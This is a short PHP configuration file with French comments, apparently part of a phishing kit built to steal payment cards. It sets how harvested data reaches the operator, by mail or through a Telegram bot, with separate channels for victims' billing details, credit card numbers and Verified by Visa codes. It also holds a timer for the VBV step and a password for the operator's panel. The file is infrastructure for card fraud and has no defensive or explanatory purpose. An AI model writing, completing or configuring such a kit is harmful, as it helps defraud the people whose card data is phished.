<?php

# Mail
$mail_send = false;                                           # False pour ne pas recevoir par Mail
$my_mail = ""; 

#Telegram
$tlg_send = true;                                       # False pour ne pas recevoir par Telegram
$bot_token = "";
$rez_billing = "";                               # Channel de réception des billings ( Page d'informations )
$rez_card = "";                                  # Channel de réception des cardings ( Page de carte de crédit )
$rez_vbv = "";                                 # Channel de réception des vbv

$vbv = true;
$timerVBV = "30";

$pass = "1234TEST"; # MOT DE PASS DE VOTRE PANEL
$test_mode = false;
?>